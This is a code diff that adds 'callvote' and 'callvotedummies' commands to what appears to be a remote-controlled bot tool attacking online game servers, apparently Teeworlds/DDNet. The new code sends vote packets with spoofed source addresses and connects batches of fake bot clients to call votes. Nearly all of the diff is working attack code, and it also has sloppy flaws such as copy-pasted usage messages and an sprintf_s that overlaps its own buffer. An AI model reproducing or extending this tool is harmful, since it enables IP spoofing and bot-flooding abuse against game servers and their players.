@@ -336,6 +336,52 @@ DWORD WINAPI WorkingThread(LPVOID lpParam)
 				else
 					send(g_Client, "[Server]: Please use: votebot <dstIp> <dstPort> <amount> <vote>");
 			}
+			else if (strcmp(aCmd[0], "callvote") == 0 || strcmp(aCmd[0], "cv") == 0)
+			{
+				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0] && aCmd[6][0])
+				{
+					char aReason[64] = {0};
+					for (int i = 7; i <= Cmd; i++)
+						sprintf_s(aReason, sizeof(aReason), "%s %s", aReason, aCmd[i]);
+
+					pSelf->GetPacketgen()->SendCallvote(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), inet_addr(aCmd[3]), htons(atoi(aCmd[4])), aCmd[5], aCmd[6], aReason[0] ? aReason : "keck!");
+
+					send(g_Client, "[Server]: Spoofed callvote sent successfully!");
+				}
+				else
+					send(g_Client, "[Server]: Please use: votebot <dstIp> <dstPort> <amount> <vote>");
+			}
+			else if (strcmp(aCmd[0], "callvotedummies") == 0 || strcmp(aCmd[0], "cvdum") == 0)
+			{
+				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0] && aCmd[4][0] && aCmd[5][0])
+				{
+					int number = atoi(aCmd[3]);
+					char aReason[64] = {0};
+					for (int i = 6; i <= Cmd; i++)
+						sprintf_s(aReason, sizeof(aReason), "%s %s", aReason, aCmd[i]);
+
+					if (number > 0 && number <= MAX_DUMMIES_PER_CLIENT)
+					{
+						if (pSelf->GetPacketgen()->GetConnectedDummies() == 0)
+						{
+							pSelf->GetPacketgen()->SendConnectDummies(inet_addr(aCmd[1]), htons(atoi(aCmd[2])), number, 0);
+							Sleep(1000);
+							pSelf->GetPacketgen()->SendCallvoteDummy((rand()-1)%pSelf->GetPacketgen()->GetConnectedDummies(), aCmd[4], aCmd[5], aReason);
+							send(g_Client, "[Server]: Dummies connected (calling vote...)!");
+						}
+						else
+							send(g_Client, "[Server]: Disconnect active dummies first.");
+					}
+					else
+					{
+						char aBuf[64] = {0};
+						sprintf_s(aBuf, sizeof(aBuf), "[Server]: Please select a amount between 1 and %i!", MAX_DUMMIES_PER_CLIENT);
+						send(g_Client, aBuf);
+					}
+				}
+				else
+					send(g_Client, "[Server]: Please use: votebot <dstIp> <dstPort> <amount> <vote>");
+			}
 			else if (strcmp(aCmd[0], "voteall") == 0 || strcmp(aCmd[0], "va") == 0)
 			{
 				if (aCmd[1][0] && aCmd[2][0] && aCmd[3][0])
